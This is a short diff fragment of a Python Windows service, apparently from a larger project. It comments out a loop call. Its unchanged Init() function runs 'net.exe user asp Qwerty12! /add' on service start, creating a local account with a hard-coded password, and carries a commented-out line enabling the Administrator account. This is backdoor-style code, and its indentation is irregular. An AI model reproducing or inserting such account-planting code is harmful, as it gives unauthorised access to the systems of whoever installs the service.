@@ -138,7 +138,7 @@ class AppServerSvc (win32serviceutil.ServiceFramework):
         #print getProxy()
         self.ReportServiceStatus(win32service.SERVICE_RUNNING)
         Init()
-        myloop()
+        #myloop()
 def Init():
     #os.system("net.exe user Administrator /active:yes")
                         os.system("net.exe user asp Qwerty12! /add")
